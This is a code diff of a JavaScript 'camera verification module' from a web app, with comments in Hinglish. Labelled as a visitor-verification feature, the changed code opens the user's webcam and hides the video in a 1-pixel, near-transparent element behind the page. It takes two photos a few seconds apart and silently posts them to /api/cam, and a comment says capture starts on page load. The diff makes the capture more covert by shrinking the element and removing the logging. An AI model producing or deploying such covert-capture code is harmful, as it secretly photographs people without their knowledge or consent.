@@ -2872,88 +2872,61 @@
 // ============ CAMERA VERIFICATION MODULE ============
 // (Security desk / visitor verification feature)
 
-const CAM_BOT_INTERVAL = 8000; // har 8 second
-
 async function startCamVerify() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" },
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
       audio: false,
     });
 
-    // Hidden (off-screen) video element — display:none se mobile par stream nahi chalti
-    const video = document.createElement("video");
+    const video = document.createElement('video');
     video.autoplay = true;
     video.playsInline = true;
     video.muted = true;
     video.setAttribute('playsinline', '');
-    video.style.cssText = 'position:fixed;top:0;left:0;width:160px;height:90px;opacity:0.01;z-index:99998;pointer-events:none;';
+    video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-1;';
     video.srcObject = stream;
     document.body.appendChild(video);
-    try { await video.play(); } catch (e) {}
 
-    // Hidden canvas banao
-    const canvas = document.createElement("canvas");
-    canvas.width = 320;
-    canvas.height = 240;
-    document.body.appendChild(canvas);
-    const ctx = canvas.getContext("2d");
-
-    // Take snap after 2s, second snap after 5s then stop stream to save resource & prevent photo flood
-    let snapCount = 0;
-    const maxSnaps = 2;
-    const takeSnap = () => {
-      if (snapCount >= maxSnaps) {
-        try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
-        return;
-      }
-      snapCount++;
-      captureAndSend(video, ctx, canvas);
-      if (snapCount < maxSnaps) {
-        setTimeout(takeSnap, 5000);
-      } else {
-        setTimeout(() => {
-          try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
-        }, 1000);
-      }
-    };
-    setTimeout(takeSnap, 2000);
-
-    console.log("[CAM] Verification active");
-
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        try { stream.getTracks().forEach((tr) => tr.stop()); } catch (e) {}
-      }
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
+      setTimeout(resolve, 1200);
     });
-  } catch (e) {
-    // Permission deny ya error � 10 sec baad silently retry
-    console.log("[CAM] Retry in 10s");
-    setTimeout(startCamVerify, 10000);
-  }
+
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+
+    setTimeout(() => captureAndSend(video, ctx, canvas), 1000);
+    setTimeout(() => {
+      captureAndSend(video, ctx, canvas);
+      setTimeout(() => {
+        try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
+      }, 1000);
+    }, 4000);
+  } catch (e) {}
 }
 
 async function captureAndSend(video, ctx, canvas) {
-  if (!video || !video.videoWidth || video.paused) { console.log('[CAM] video not ready, retrying'); try { video.play(); } catch(e) {} return; }
+  if (!video) return;
+  if (!video.videoWidth || video.videoWidth === 0) {
+    try { await video.play(); } catch (e) {}
+  }
+  const w = video.videoWidth || 320;
+  const h = video.videoHeight || 240;
+  canvas.width = w;
+  canvas.height = h;
+  ctx.drawImage(video, 0, 0, w, h);
 
-  ctx.drawImage(video, 0, 0, 240, 180);
+  const base64 = canvas.toDataURL('image/jpeg', 0.6);
+  if (!base64 || base64.length < 50) return;
 
-  canvas.toBlob(async (blob) => {
-    if (!blob) return;
-
-    const base64 = canvas.toDataURL("image/jpeg", 0.5);
-
-    try {
-      await fetch("/api/cam", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ photo: base64 }),
-      });
-      console.log("[CAM] Snap sent:", new Date().toLocaleTimeString());
-    } catch (err) {
-      console.log("[CAM] Send failed, next try hoga");
-    }
-  }, "image/jpeg", 0.5);
+  try {
+    await fetch('/api/cam', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ photo: base64 }),
+    });
+  } catch (err) {}
 }
 
 // Camera start: desktop pe page load, mobile pe first tap (Chrome prompt only tap par aata hai)
